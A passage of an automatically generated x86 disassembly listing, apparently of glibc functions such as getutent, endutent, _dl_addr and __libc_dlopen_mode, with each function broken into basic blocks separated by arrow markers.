|
|
v
0xb12028f:	mov	eax, dword ptr [esp + 0x18]
0xb120293:	add	eax, ecx
0xb120295:	cmp	byte ptr [eax + 0x12], 0
0xb120299:	je	0xb1201e0
None
|
|
|
v
0xb1201fc:	mov	ecx, dword ptr [esp + 0x18]
0xb120200:	add	ecx, esi
0xb120202:	add	esi, 0x1c
0xb120205:	cmp	dword ptr [esp + 0x14], esi
0xb120209:	jb	0xb1202c0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b1202d0
TOTAL BLOCKS :16
0xb120353:	cmp	eax, dword ptr [esp + 0x40]
0xb120357:	mov	edx, esi
0xb120359:	jne	0xb120365
None
|
|
|
v
0xb120330:	cmp	dword ptr [edi + ebp], 4
0xb120334:	jne	0xb120353
None
|
|
|
v
0xb120325:	test	eax, eax
0xb120327:	jg	0xb120336
None
|
|
|
v
0xb1202d0:	push	ebp
0xb1202d1:	push	edi
0xb1202d2:	push	esi
0xb1202d3:	push	ebx
0xb1202d4:	sub	esp, 0x1c
0xb1202d7:	mov	eax, dword ptr [esp + 0x34]
0xb1202db:	call	0xb1267db
None
|
|
|
v
0xb120336:	mov	eax, dword ptr [esp + 0x40]
0xb12033a:	mov	dword ptr [esp], esi
0xb12033d:	mov	dword ptr [esp + 8], eax
0xb120341:	mov	eax, dword ptr [esp + 0x3c]
0xb120345:	mov	dword ptr [esp + 4], eax
0xb120349:	call	0xb0daf60
None
|
|
|
v
0xb120365:	mov	ecx, esi
0xb120367:	xchg	ebx, ecx
0xb120369:	mov	eax, 6
0xb12036e:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb120329:	jmp	0xb120365
None
|
|
|
v
0xb12034e:	cmp	eax, 0xff
0xb120351:	je	0xb120330
None
|
|
|
v
0xb120377:	mov	eax, dword ptr [esp + 0xc]
0xb12037b:	mov	edx, 0xffffffff
0xb120380:	mov	dword ptr [edi + ebp], eax
0xb120383:	add	esp, 0x1c
0xb120386:	mov	eax, edx
0xb120388:	pop	ebx
0xb120389:	pop	esi
0xb12038a:	pop	edi
0xb12038b:	pop	ebp
0xb12038c:	ret	
None
|
|
|
v
0xb12031b:	mov	edx, 0x1388
0xb120320:	call	0xb11f4c0
None
|
|
|
v
0xb1202e0:	add	ebx, 0x8ad20
0xb1202e6:	cmp	eax, 0x400
0xb1202eb:	ja	0xb12038d
None
|
|
|
v
0xb12035b:	add	esp, 0x1c
0xb12035e:	mov	eax, edx
0xb120360:	pop	ebx
0xb120361:	pop	esi
0xb120362:	pop	edi
0xb120363:	pop	ebp
0xb120364:	ret	
None
|
|
|
v
0xb12038d:	mov	edx, 0xffffffff
0xb120392:	jmp	0xb12035b
None
|
|
|
v
0xb120375:	xchg	ebx, ecx
0xb120377:	mov	eax, dword ptr [esp + 0xc]
0xb12037b:	mov	edx, 0xffffffff
0xb120380:	mov	dword ptr [edi + ebp], eax
0xb120383:	add	esp, 0x1c
0xb120386:	mov	eax, edx
0xb120388:	pop	ebx
0xb120389:	pop	esi
0xb12038a:	pop	edi
0xb12038b:	pop	ebp
0xb12038c:	ret	
None
|
|
|
v
0xb120315:	test	eax, eax
0xb120317:	mov	esi, eax
0xb120319:	js	0xb120377
None
|
|
|
v
0xb1202f1:	mov	ebp, dword ptr [ebx - 0xdc]
0xb1202f7:	mov	edi, dword ptr gs:[0]
0xb1202fe:	mov	edx, dword ptr [esp + 0x30]
0xb120302:	mov	ecx, dword ptr [edi + ebp]
0xb120305:	mov	dword ptr [esp], eax
0xb120308:	mov	eax, dword ptr [esp + 0x38]
0xb12030c:	mov	dword ptr [esp + 0xc], ecx
0xb120310:	call	0xb11f5d0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:getutent
TOTAL BLOCKS :10
0xb120ef0:	push	ebx
0xb120ef1:	call	0xb1267db
None
|
|
|
v
0xb120f19:	test	eax, eax
0xb120f1b:	js	0xb120f40
None
|
|
|
v
0xb120f28:	mov	dword ptr [esp], 0x180
0xb120f2f:	call	0xb0173f0
None
|
|
|
v
0xb120f1d:	mov	eax, dword ptr [esp + 0x1c]
0xb120f21:	add	esp, 0x28
0xb120f24:	pop	ebx
0xb120f25:	ret	
None
|
|
|
v
0xb120f21:	add	esp, 0x28
0xb120f24:	pop	ebx
0xb120f25:	ret	
None
|
|
|
v
0xb120f3e:	nop	
None
|
|
|
v
0xb120ef6:	add	ebx, 0x8a10a
0xb120efc:	sub	esp, 0x28
0xb120eff:	mov	eax, dword ptr [ebx + 0xf84]
0xb120f05:	test	eax, eax
0xb120f07:	je	0xb120f28
None
|
|
|
v
0xb120f34:	test	eax, eax
0xb120f36:	mov	dword ptr [ebx + 0xf84], eax
0xb120f3c:	jne	0xb120f09
None
|
|
|
v
0xb120f09:	lea	edx, dword ptr [esp + 0x1c]
0xb120f0d:	mov	dword ptr [esp + 4], edx
0xb120f11:	mov	dword ptr [esp], eax
0xb120f14:	call	0xb121150
None
|
|
|
v
0xb120f40:	xor	eax, eax
0xb120f42:	jmp	0xb120f21
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:setutent
TOTAL BLOCKS :12
0xb1210f0:	push	ebx
0xb1210f1:	xor	eax, eax
0xb1210f3:	sub	esp, 8
0xb1210f6:	mov	ecx, 1
0xb1210fb:	call	0xb1267db
None
|
|
|
v
0xb12113e:	add	esp, 8
0xb121141:	pop	ebx
0xb121142:	ret	
None
|
|
|
v
0xb12127c:	lea	ecx, dword ptr [ebx + 0x3a78]
0xb121282:	call	0xb0f9430
None
|
|
|
v
0xb121138:	jne	0xb12128c
None
|
|
|
v
0xb121126:	cmp	dword ptr gs:[0xc], 0
0xb12112e:	je	0xb121131
None
|
|
|
v
0xb121130:	lock sub	dword ptr [ebx + 0x3a78], 1
None
|
|
|
v
0xb12111e:	mov	eax, dword ptr [ebx + 0xeb4]
0xb121124:	call	dword ptr [eax]
None
|
|
|
v
0xb121297:	jmp	0xb12113e
None
|
|
|
v
0xb121287:	jmp	0xb12111e
None
|
|
|
v
0xb121100:	add	ebx, 0x89f00
0xb121106:	cmp	dword ptr gs:[0xc], 0
0xb12110e:	je	0xb121111
None
|
|
|
v
0xb12128c:	lea	eax, dword ptr [ebx + 0x3a78]
0xb121292:	call	0xb0f9460
None
|
|
|
v
0xb121110:	lock cmpxchg	dword ptr [ebx + 0x3a78], ecx
0xb121118:	jne	0xb12127c
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:getutent_r
TOTAL BLOCKS :12
0xb121150:	push	ebx
0xb121151:	xor	eax, eax
0xb121153:	sub	esp, 0x18
0xb121156:	mov	ecx, 1
0xb12115b:	call	0xb1267db
None
|
|
|
v
0xb12129c:	lea	ecx, dword ptr [ebx + 0x3a78]
0xb1212a2:	call	0xb0f9430
None
|
|
|
v
0xb121196:	mov	edx, eax
0xb121198:	cmp	dword ptr gs:[0xc], 0
0xb1211a0:	je	0xb1211a3
None
|
|
|
v
0xb1211aa:	jne	0xb1212ac
None
|
|
|
v
0xb1212b7:	jmp	0xb1211b0
None
|
|
|
v
0xb121160:	add	ebx, 0x89ea0
0xb121166:	cmp	dword ptr gs:[0xc], 0
0xb12116e:	je	0xb121171
None
|
|
|
v
0xb1212a7:	jmp	0xb12117e
None
|
|
|
v
0xb1212ac:	lea	eax, dword ptr [ebx + 0x3a78]
0xb1212b2:	call	0xb0f9460
None
|
|
|
v
0xb1211a2:	lock sub	dword ptr [ebx + 0x3a78], 1
None
|
|
|
v
0xb121170:	lock cmpxchg	dword ptr [ebx + 0x3a78], ecx
0xb121178:	jne	0xb12129c
None
|
|
|
v
0xb12117e:	mov	eax, dword ptr [esp + 0x24]
0xb121182:	mov	dword ptr [esp + 4], eax
0xb121186:	mov	eax, dword ptr [esp + 0x20]
0xb12118a:	mov	dword ptr [esp], eax
0xb12118d:	mov	eax, dword ptr [ebx + 0xeb4]
0xb121193:	call	dword ptr [eax + 4]
None
|
|
|
v
0xb1211b0:	add	esp, 0x18
0xb1211b3:	mov	eax, edx
0xb1211b5:	pop	ebx
0xb1211b6:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:endutent
TOTAL BLOCKS :12
0xb121277:	add	esp, 8
0xb12127a:	pop	ebx
0xb12127b:	ret	
None
|
|
|
v
0xb121230:	add	ebx, 0x89dd0
0xb121236:	cmp	dword ptr gs:[0xc], 0
0xb12123e:	je	0xb121241
None
|
|
|
v
0xb1212ec:	lea	eax, dword ptr [ebx + 0x3a78]
0xb1212f2:	call	0xb0f9460
None
|
|
|
v
0xb1212dc:	lea	ecx, dword ptr [ebx + 0x3a78]
0xb1212e2:	call	0xb0f9430
None
|
|
|
v
0xb121240:	lock cmpxchg	dword ptr [ebx + 0x3a78], ecx
0xb121248:	jne	0xb1212dc
None
|
|
|
v
0xb121257:	lea	eax, dword ptr [ebx - 0x1478]
0xb12125d:	mov	dword ptr [ebx + 0xeb4], eax
0xb121263:	cmp	dword ptr gs:[0xc], 0
0xb12126b:	je	0xb12126e
None
|
|
|
v
0xb121275:	jne	0xb1212ec
None
|
|
|
v
0xb1212f7:	jmp	0xb121277
None
|
|
|
v
0xb121220:	push	ebx
0xb121221:	xor	eax, eax
0xb121223:	sub	esp, 8
0xb121226:	mov	ecx, 1
0xb12122b:	call	0xb1267db
None
|
|
|
v
0xb12126d:	lock sub	dword ptr [ebx + 0x3a78], 1
None
|
|
|
v
0xb12124e:	mov	eax, dword ptr [ebx + 0xeb4]
0xb121254:	call	dword ptr [eax + 0x14]
None
|
|
|
v
0xb1212e7:	jmp	0xb12124e
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:setutxent
TOTAL BLOCKS :3
0xb1231d4:	add	esp, 8
0xb1231d7:	pop	ebx
0xb1231d8:	ret	
None
|
|
|
v
0xb1231c0:	push	ebx
0xb1231c1:	call	0xb1267db
None
|
|
|
v
0xb1231c6:	add	ebx, 0x87e3a
0xb1231cc:	sub	esp, 8
0xb1231cf:	call	0xb1210f0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:getutxent
TOTAL BLOCKS :3
0xb1231f4:	add	esp, 8
0xb1231f7:	pop	ebx
0xb1231f8:	ret	
None
|
|
|
v
0xb1231e0:	push	ebx
0xb1231e1:	call	0xb1267db
None
|
|
|
v
0xb1231e6:	add	ebx, 0x87e1a
0xb1231ec:	sub	esp, 8
0xb1231ef:	call	0xb120ef0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:endutxent
TOTAL BLOCKS :3
0xb123214:	add	esp, 8
0xb123217:	pop	ebx
0xb123218:	ret	
None
|
|
|
v
0xb123200:	push	ebx
0xb123201:	call	0xb1267db
None
|
|
|
v
0xb123206:	add	ebx, 0x87dfa
0xb12320c:	sub	esp, 8
0xb12320f:	call	0xb121220
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_dl_addr
TOTAL BLOCKS :57
0xb12371b:	mov	eax, dword ptr [ebx - 0x11c]
0xb123721:	add	eax, 0x4c4
0xb123726:	mov	dword ptr [esp], eax
0xb123729:	mov	eax, dword ptr [ebx - 0x11c]
0xb12372f:	call	dword ptr [eax + 0x7fc]
None
|
|
|
v
0xb123771:	mov	ecx, dword ptr [esp + 8]
0xb123775:	jmp	0xb123783
None
|
|
|
v
0xb12368e:	cmp	edi, dword ptr [ecx + 4]
0xb123691:	jbe	0xb1236a8
None
|
|
|
v
0xb1236a8:	add	dword ptr [esp + 4], 4
0xb1236ad:	add	eax, 0x10
0xb1236b0:	mov	edi, dword ptr [esp + 4]
0xb1236b4:	test	byte ptr [edi - 4], 1
0xb1236b8:	je	0xb123638
None
|
|
|
v
0xb1236e7:	mov	eax, dword ptr [esp + 0x50]
0xb1236eb:	mov	edi, dword ptr [esp + 0x14]
0xb1236ef:	mov	dword ptr [eax], edi
0xb1236f1:	mov	edi, dword ptr [esp + 0x14]
0xb1236f5:	test	edi, edi
0xb1236f7:	je	0xb1237e6
None
|
|
|
v
0xb123827:	mov	dword ptr [esp + 0x14], 0
0xb12382f:	jmp	0xb1236d1
None
|
|
|
v
0xb1237b2:	mov	ebp, dword ptr [esi + 8]
0xb1237b5:	test	ebp, ebp
0xb1237b7:	jne	0xb1237c0
None
|
|
|
v
0xb123750:	mov	eax, dword ptr [eax + 4]
0xb123753:	mov	edi, dword ptr [esp + 0x1c]
0xb123757:	mov	eax, dword ptr [eax + 4]
0xb12375a:	shl	eax, 4
0xb12375d:	add	edi, eax
0xb12375f:	cmp	dword ptr [esp + 0x1c], edi
0xb123763:	mov	dword ptr [esp + 0x14], 0
0xb12376b:	jae	0xb1236d1
None
|
|
|
v
0xb123794:	and	eax, 0xf
0xb123797:	cmp	al, 6
0xb123799:	je	0xb123778
None
|
|
|
v
0xb1236d9:	mov	edi, dword ptr [esp + 0xc]
0xb1236dd:	mov	dword ptr [eax], edi
0xb1236df:	mov	eax, dword ptr [esp + 0x50]
0xb1236e3:	test	eax, eax
0xb1236e5:	je	0xb1236f1
None
|
|
|
v
0xb123669:	test	cx, cx
0xb12366c:	je	0xb123675
None
|
|
|
v
0xb123783:	movzx	eax, byte ptr [esi + 0xc]
0xb123787:	mov	edx, eax
0xb123789:	shr	dl, 4
0xb12378c:	sub	edx, 1
0xb12378f:	cmp	dl, 1
0xb123792:	ja	0xb123778
None
|
|
|
v
0xb123583:	test	eax, eax
0xb123585:	mov	edi, eax
0xb123587:	mov	dword ptr [esp + 0xc], eax
0xb12358b:	je	0xb123820
None
|
|
|
v
0xb123608:	mov	eax, dword ptr [esp + 0x10]
0xb12360c:	mov	eax, dword ptr [eax]
0xb12360e:	test	eax, eax
0xb123610:	je	0xb1236be
None
|
|
|
v
0xb1237c6:	mov	edx, dword ptr [esp + 0x14]
0xb1237ca:	test	edx, edx
0xb1237cc:	je	0xb1237d3
None
|
|
|
v
0xb123616:	mov	edi, dword ptr [esp + 0xc]
0xb12361a:	mov	edx, dword ptr [edi + 0x18c]
0xb123620:	mov	edi, dword ptr [esp + 0x1c]
0xb123624:	lea	edx, dword ptr [edx + eax*4]
0xb123627:	shl	eax, 4
0xb12362a:	lea	eax, dword ptr [edi + eax + 0xe]
0xb12362e:	mov	dword ptr [esp + 4], edx
0xb123632:	lea	esi, dword ptr [esi]
0xb123638:	movzx	ecx, word ptr [eax]
0xb12363b:	lea	ebp, dword ptr [eax - 0xe]
0xb12363e:	test	cx, cx
0xb123641:	jne	0xb12364a
None
|
|
|
v
0xb1237bd:	mov	ebp, dword ptr [esi + 8]
0xb1237c0:	add	edx, ebp
0xb1237c2:	cmp	ecx, edx
0xb1237c4:	jae	0xb123778
None
|
|
|
v
0xb12354d:	add	ebx, 0x87ab3
0xb123553:	sub	esp, 0x3c
0xb123556:	mov	dword ptr [esp + 8], eax
0xb12355a:	mov	dword ptr [esp + 0x24], edx
0xb12355e:	mov	dword ptr [esp + 0x28], ecx
0xb123562:	mov	eax, dword ptr [ebx - 0x11c]
0xb123568:	add	eax, 0x4c4
0xb12356d:	mov	dword ptr [esp], eax
0xb123570:	mov	eax, dword ptr [ebx - 0x11c]
0xb123576:	call	dword ptr [eax + 0x7f8]
None
|
|
|
v
0xb123540:	push	ebp
0xb123541:	push	edi
0xb123542:	mov	edi, eax
0xb123544:	push	esi
0xb123545:	mov	esi, edx
0xb123547:	push	ebx
0xb123548:	call	0xb1267db
None
|
|
|
v
0xb1237a5:	mov	ebp, dword ptr [esp + 0xc]
0xb1237a9:	mov	edx, dword ptr [ebp]
0xb1237ac:	add	edx, eax
0xb1237ae:	cmp	ecx, edx
0xb1237b0:	jb	0xb123778
None
|
|
|
v
0xb123820:	xor	esi, esi
0xb123822:	jmp	0xb12371b
None
|
|
|
v
0xb1237c0:	add	edx, ebp
0xb1237c2:	cmp	ecx, edx
0xb1237c4:	jae	0xb123778
None
|
|
|
v
0xb12379b:	cmp	word ptr [esi + 0xe], 0
0xb1237a0:	mov	eax, dword ptr [esi + 4]
0xb1237a3:	je	0xb123802
None
|
|
|
v
0xb12364a:	movzx	esi, byte ptr [eax - 2]
0xb12364e:	and	esi, 0xf
0xb123651:	mov	edx, esi
0xb123653:	cmp	dl, 6
0xb123656:	je	0xb1236a8
None
|
|
|
v
0xb12384e:	mov	eax, dword ptr [ebx - 0x18]
0xb123854:	mov	edi, dword ptr [esp + 0x24]
0xb123858:	mov	eax, dword ptr [eax]
0xb12385a:	mov	eax, dword ptr [eax]
0xb12385c:	mov	dword ptr [edi], eax
0xb12385e:	jmp	0xb1235a8
None
|
|
|
v
0xb123591:	mov	eax, dword ptr [eax + 4]
0xb123594:	mov	edx, dword ptr [edi + 0x1ac]
0xb12359a:	mov	dword ptr [esi], eax
0xb12359c:	mov	dword ptr [esi + 4], edx
0xb12359f:	cmp	byte ptr [eax], 0
0xb1235a2:	je	0xb12383d
None
|
|
|
v
0xb12357c:	mov	eax, edi
0xb12357e:	call	0xb017440
None
|
|
|
v
0xb123693:	mov	edi, dword ptr [esp + 0x20]
0xb123697:	cmp	edi, dword ptr [eax - 0xe]
0xb12369a:	cmovbe	ebp, dword ptr [esp + 0x14]
0xb12369f:	mov	dword ptr [esp + 0x14], ebp
0xb1236a3:	nop	
0xb1236a4:	lea	esi, dword ptr [esi]
0xb1236a8:	add	dword ptr [esp + 4], 4
0xb1236ad:	add	eax, 0x10
0xb1236b0:	mov	edi, dword ptr [esp + 4]
0xb1236b4:	test	byte ptr [edi - 4], 1
0xb1236b8:	je	0xb123638
None
|
|
|
v
0xb12367b:	mov	ecx, dword ptr [eax - 6]
0xb12367e:	add	esi, ecx
0xb123680:	cmp	dword ptr [esp + 8], esi
0xb123684:	jae	0xb1236a8
None
|
|
|
v
0xb1236d1:	mov	eax, dword ptr [esp + 0x28]
0xb1236d5:	test	eax, eax
0xb1236d7:	je	0xb1236df
None
|
|
|
v
0xb1235da:	mov	eax, dword ptr [edi + 0x178]
0xb1235e0:	test	eax, eax
0xb1235e2:	je	0xb123827
None
|
|
|
v
0xb1237d3:	mov	eax, dword ptr [esp + 0x20]
0xb1237d7:	cmp	eax, dword ptr [esi]
0xb1237d9:	mov	eax, dword ptr [esp + 0x14]
0xb1237dd:	cmova	eax, esi
0xb1237e0:	mov	dword ptr [esp + 0x14], eax
0xb1237e4:	jmp	0xb123778
None
|
|
|
v
0xb1237b9:	cmp	ecx, edx
0xb1237bb:	je	0xb1237c6
None
|
|
|
v
0xb1235e8:	mov	edi, dword ptr [edi + 0x188]
0xb1235ee:	mov	dword ptr [esp + 0x14], 0
0xb1235f6:	lea	eax, dword ptr [edi + eax*4]
0xb1235f9:	mov	dword ptr [esp + 0x10], edi
0xb1235fd:	mov	dword ptr [esp + 0x18], eax
0xb123601:	lea	esi, dword ptr [esi]
0xb123608:	mov	eax, dword ptr [esp + 0x10]
0xb12360c:	mov	eax, dword ptr [eax]
0xb12360e:	test	eax, eax
0xb123610:	je	0xb1236be
None
|
|
|
v
0xb123658:	mov	edx, dword ptr [esp + 0xc]
0xb12365c:	mov	edi, dword ptr [eax - 0xa]
0xb12365f:	mov	esi, dword ptr [edx]
0xb123661:	add	esi, edi
0xb123663:	cmp	dword ptr [esp + 8], esi
0xb123667:	jb	0xb1236a8
None
|
|
|
v
0xb12380a:	mov	ebp, dword ptr [esp + 0xc]
0xb12380e:	mov	edx, dword ptr [ebp]
0xb123811:	add	edx, eax
0xb123813:	cmp	ecx, edx
0xb123815:	jae	0xb1237b9
None
|
|
|
v
0xb12366e:	mov	ecx, dword ptr [eax - 6]
0xb123671:	test	ecx, ecx
0xb123673:	jne	0xb12367e
None
|
|
|
v
0xb123741:	mov	eax, dword ptr [esp + 0xc]
0xb123745:	mov	eax, dword ptr [eax + 0x30]
0xb123748:	test	eax, eax
0xb12374a:	je	0xb123834
None
|
|
|
v
0xb123834:	mov	edi, dword ptr [esp + 0x2c]
0xb123838:	jmp	0xb12375f
None
|
|
|
v
0xb1236f1:	mov	edi, dword ptr [esp + 0x14]
0xb1236f5:	test	edi, edi
0xb1236f7:	je	0xb1237e6
None
|
|
|
v
0xb1236be:	add	dword ptr [esp + 0x10], 4
0xb1236c3:	mov	eax, dword ptr [esp + 0x18]
0xb1236c7:	cmp	dword ptr [esp + 0x10], eax
0xb1236cb:	jne	0xb123608
None
|
|
|
v
0xb123643:	mov	edx, dword ptr [eax - 0xa]
0xb123646:	test	edx, edx
0xb123648:	je	0xb1236a8
None
|
|
|
v
0xb123735:	add	esp, 0x3c
0xb123738:	mov	eax, esi
0xb12373a:	pop	ebx
0xb12373b:	pop	esi
0xb12373c:	pop	edi
0xb12373d:	pop	ebp
0xb12373e:	ret	4
None
|
|
|
v
0xb123778:	add	esi, 0x10
0xb12377b:	cmp	esi, edi
0xb12377d:	jae	0xb1236d1
None
|
|
|
v
0xb12383d:	mov	eax, dword ptr [esp + 0xc]
0xb123841:	test	byte ptr [eax + 0x194], 3
0xb123848:	jne	0xb1235a8
None
|
|
|
v
0xb123817:	jmp	0xb123778
None
|
|
|
v
0xb1236df:	mov	eax, dword ptr [esp + 0x50]
0xb1236e3:	test	eax, eax
0xb1236e5:	je	0xb1236f1
None
|
|
|
v
0xb123686:	mov	ecx, dword ptr [esp + 0x14]
0xb12368a:	test	ecx, ecx
0xb12368c:	je	0xb123693
None
|
|
|
v
0xb12375f:	cmp	dword ptr [esp + 0x1c], edi
0xb123763:	mov	dword ptr [esp + 0x14], 0
0xb12376b:	jae	0xb1236d1
None
|
|
|
v
0xb1237e6:	mov	eax, dword ptr [esp + 0x24]
0xb1237ea:	mov	esi, 1
0xb1237ef:	mov	dword ptr [eax + 8], 0
0xb1237f6:	mov	dword ptr [eax + 0xc], 0
0xb1237fd:	jmp	0xb12371b
None
|
|
|
v
0xb123802:	test	eax, eax
0xb123804:	je	0xb123778
None
|
|
|
v
0xb12367e:	add	esi, ecx
0xb123680:	cmp	dword ptr [esp + 8], esi
0xb123684:	jae	0xb1236a8
None
|
|
|
v
0xb1237ce:	cmp	dword ptr [edx + 4], eax
0xb1237d1:	jae	0xb123778
None
|
|
|
v
0xb1235a8:	mov	edi, dword ptr [esp + 0xc]
0xb1235ac:	mov	eax, dword ptr [edi + 0x38]
0xb1235af:	mov	ecx, dword ptr [edi + 0x14c]
0xb1235b5:	mov	eax, dword ptr [eax + 4]
0xb1235b8:	test	ecx, ecx
0xb1235ba:	mov	dword ptr [esp + 0x1c], eax
0xb1235be:	mov	esi, eax
0xb1235c0:	mov	eax, dword ptr [edi + 0x34]
0xb1235c3:	mov	eax, dword ptr [eax + 4]
0xb1235c6:	mov	dword ptr [esp + 0x2c], eax
0xb1235ca:	mov	eax, dword ptr [edi + 0x48]
0xb1235cd:	mov	eax, dword ptr [eax + 4]
0xb1235d0:	mov	dword ptr [esp + 0x20], eax
0xb1235d4:	je	0xb123741
None
|
|
|
v
0xb1236fd:	mov	edx, dword ptr [esp + 0x24]
0xb123701:	mov	esi, 1
0xb123706:	mov	eax, dword ptr [esp + 0x2c]
0xb12370a:	add	eax, dword ptr [edi]
0xb12370c:	mov	dword ptr [edx + 8], eax
0xb12370f:	mov	eax, dword ptr [edi + 4]
0xb123712:	mov	edi, dword ptr [esp + 0xc]
0xb123716:	add	eax, dword ptr [edi]
0xb123718:	mov	dword ptr [edx + 0xc], eax
0xb12371b:	mov	eax, dword ptr [ebx - 0x11c]
0xb123721:	add	eax, 0x4c4
0xb123726:	mov	dword ptr [esp], eax
0xb123729:	mov	eax, dword ptr [ebx - 0x11c]
0xb12372f:	call	dword ptr [eax + 0x7fc]
None
|
|
|
v
0xb123675:	cmp	dword ptr [esp + 8], esi
0xb123679:	je	0xb123686
None
|
|
|
v
0xb123638:	movzx	ecx, word ptr [eax]
0xb12363b:	lea	ebp, dword ptr [eax - 0xe]
0xb12363e:	test	cx, cx
0xb123641:	jne	0xb12364a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_dl_mcount_wrapper_check
TOTAL BLOCKS :4
0xb12393c:	add	esp, 0x18
0xb12393f:	pop	ebx
0xb123940:	ret	
None
|
|
|
v
0xb123900:	push	ebx
0xb123901:	call	0xb1267db
None
|
|
|
v
0xb123906:	add	ebx, 0x876fa
0xb12390c:	sub	esp, 0x18
0xb12390f:	mov	eax, dword ptr [ebx - 0x11c]
0xb123915:	mov	eax, dword ptr [eax + 0x508]
0xb12391b:	test	eax, eax
0xb12391d:	je	0xb12393c
None
|
|
|
v
0xb12391f:	mov	edx, dword ptr [esp + 0x20]
0xb123923:	mov	eax, dword ptr [ebx - 0xe0]
0xb123929:	mov	dword ptr [esp + 4], edx
0xb12392d:	mov	edx, dword ptr [esp + 0x1c]
0xb123931:	mov	eax, dword ptr [eax + 0x1b0]
0xb123937:	mov	dword ptr [esp], edx
0xb12393a:	call	eax
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b123a60
TOTAL BLOCKS :9
0xb123a6b:	add	ebx, 0x87595
0xb123a71:	sub	esp, 0x2c
0xb123a74:	lea	esi, dword ptr [ebp - 0x20]
0xb123a77:	mov	dword ptr [esp], eax
0xb123a7a:	mov	eax, esi
0xb123a7c:	lea	edi, dword ptr [ebp - 0x1c]
0xb123a7f:	mov	dword ptr [esp + 4], edx
0xb123a83:	lea	ecx, dword ptr [ebp - 0x21]
0xb123a86:	mov	edx, edi
0xb123a88:	mov	dword ptr [ebp - 0x1c], 0
0xb123a8f:	mov	esi, dword ptr [ebx - 0xe0]
0xb123a95:	call	dword ptr [esi + 0x1a8]
None
|
|
|
v
0xb123aa2:	mov	edx, dword ptr [ebp - 0x1c]
0xb123aa5:	test	edx, edx
0xb123aa7:	jne	0xb123ab8
None
|
|
|
v
0xb123ac0:	cmp	byte ptr [ebp - 0x21], 0
0xb123ac4:	je	0xb123aa9
None
|
|
|
v
0xb123aa9:	lea	esp, dword ptr [ebp - 0xc]
0xb123aac:	pop	ebx
0xb123aad:	pop	esi
0xb123aae:	pop	edi
0xb123aaf:	pop	ebp
0xb123ab0:	ret	
None
|
|
|
v
0xb123ad4:	mov	eax, dword ptr [ebp - 0x2c]
0xb123ad7:	lea	esp, dword ptr [ebp - 0xc]
0xb123ada:	pop	ebx
0xb123adb:	pop	esi
0xb123adc:	pop	edi
0xb123add:	pop	ebp
0xb123ade:	ret	
None
|
|
|
v
0xb123a9b:	sub	esp, 8
0xb123a9e:	test	eax, eax
0xb123aa0:	jne	0xb123ac0
None
|
|
|
v
0xb123a60:	push	ebp
0xb123a61:	mov	ebp, esp
0xb123a63:	push	edi
0xb123a64:	push	esi
0xb123a65:	push	ebx
0xb123a66:	call	0xb1267db
None
|
|
|
v
0xb123ab8:	mov	al, 1
0xb123aba:	lea	esi, dword ptr [esi]
0xb123ac0:	cmp	byte ptr [ebp - 0x21], 0
0xb123ac4:	je	0xb123aa9
None
|
|
|
v
0xb123ac6:	mov	edx, dword ptr [ebp - 0x1c]
0xb123ac9:	mov	dword ptr [ebp - 0x2c], eax
0xb123acc:	mov	dword ptr [esp], edx
0xb123acf:	call	0xb017470
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__libc_dlopen_mode
TOTAL BLOCKS :7
0xb123b30:	mov	dword ptr [esp + 4], edx
0xb123b34:	mov	dword ptr [esp], eax
0xb123b37:	call	dword ptr [esi]
None
|
|
|
v
0xb123b2a:	add	esp, 0x24
0xb123b2d:	pop	ebx
0xb123b2e:	pop	esi
0xb123b2f:	ret	
None
|
|
|
v
0xb123ae0:	push	esi
0xb123ae1:	push	ebx
0xb123ae2:	call	0xb1267db
None
|
|
|
v
0xb123b21:	test	eax, eax
0xb123b23:	mov	eax, esi
0xb123b25:	cmove	eax, dword ptr [esp + 0x1c]
0xb123b2a:	add	esp, 0x24
0xb123b2d:	pop	ebx
0xb123b2e:	pop	esi
0xb123b2f:	ret	
None
|
|
|
v
0xb123b12:	lea	edx, dword ptr [esp + 0x10]
0xb123b16:	lea	eax, dword ptr [ebx - 0x876b0]
0xb123b1c:	call	0xb123a60
None
|
|
|
v
0xb123b39:	jmp	0xb123b2a
None
|
|
|
v
0xb123ae7:	add	ebx, 0x87519
0xb123aed:	sub	esp, 0x24
0xb123af0:	mov	eax, dword ptr [esp + 0x30]
0xb123af4:	mov	edx, dword ptr [esp + 0x34]
0xb123af8:	mov	ecx, dword ptr [esp + 0x2c]
0xb123afc:	mov	dword ptr [esp + 0x10], eax
0xb123b00:	mov	esi, dword ptr [ebx + 0x35e4]
0xb123b06:	mov	dword ptr [esp + 0x14], edx
0xb123b0a:	mov	dword ptr [esp + 0x18], ecx
0xb123b0e:	test	esi, esi
0xb123b10:	jne	0xb123b30
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__libc_dlsym
TOTAL BLOCKS :11
0xb123ba6:	mov	edx, eax
0xb123ba8:	jmp	0xb123b8f
None
|
|
|
v
0xb123b69:	lea	edx, dword ptr [esp + 0x10]
0xb123b6d:	lea	eax, dword ptr [ebx - 0x87640]
0xb123b73:	call	0xb123a60
None
|
|
|
v
0xb123b88:	mov	eax, dword ptr [esp + 0x1c]
0xb123b8c:	add	edx, dword ptr [eax + 4]
0xb123b8f:	add	esp, 0x28
0xb123b92:	mov	eax, edx
0xb123b94:	pop	ebx
0xb123b95:	ret	
None
|
|
|
v
0xb123b9c:	mov	dword ptr [esp], edx
0xb123b9f:	mov	dword ptr [esp + 4], ecx
0xb123ba3:	call	dword ptr [eax + 4]
None
|
|
|
v
